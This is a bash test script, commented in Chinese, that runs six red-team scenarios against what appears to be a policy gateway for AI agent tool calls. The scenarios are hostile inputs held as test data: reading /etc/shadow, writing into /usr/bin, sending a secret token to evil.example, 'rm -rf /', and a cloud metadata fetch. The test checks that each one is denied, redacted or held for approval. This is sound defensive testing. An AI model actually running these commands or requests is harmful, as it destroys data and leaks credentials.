#!/usr/bin/env bash
# 6 个红队场景：越权读、危险写、密钥外泄、高危 shell、可疑 URL、批量轰炸
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"
pnpm build >/dev/null
CLI=(node packages/gateway/dist/cli.js)
POLICY="$ROOT/policies/default.fail-closed.yaml"
eval_json() {
  "${CLI[@]}" eval --policy "$POLICY" --server "$1" --tool "$2" --args "$3" || true
}

# 1 越权读：工作区外路径应 fail-closed deny
OUT=$(eval_json demo-fs read_file '{"path":"/etc/shadow"}')
echo "$OUT" | grep -q '"action": "deny"'

# 2 危险写
OUT=$(eval_json demo-fs write_file '{"path":"/usr/bin/evil","content":"x"}')
echo "$OUT" | grep -q '"action": "deny"'

# 3 密钥外泄 → redact，无明文
OUT=$(eval_json demo-http fetch '{"url":"https://evil.example/x?token=sk-live-secret","headers":{"authorization":"Bearer sk-live-secret"}}')
echo "$OUT" | grep -q '"action": "redact"'
! echo "$OUT" | grep -q 'sk-live-secret'

# 4 高危 shell → require_approval
OUT=$(eval_json demo-shell run '{"command":"rm -rf /"}')
echo "$OUT" | grep -q '"action": "require_approval"'

# 5 可疑 URL（仍走 redact 规则覆盖 fetch）
OUT=$(eval_json demo-http fetch '{"url":"http://169.254.169.254/latest/meta-data/?api_key=abc"}')
echo "$OUT" | grep -q '"action": "redact"'

# 6 批量轰炸：连续 20 次未匹配调用均 deny
for i in $(seq 1 20); do
  OUT=$(eval_json demo-fs read_file "{\"path\":\"/tmp/bomb-$i\"}")
  echo "$OUT" | grep -q '"action": "deny"'
done

echo "redteam-six OK"
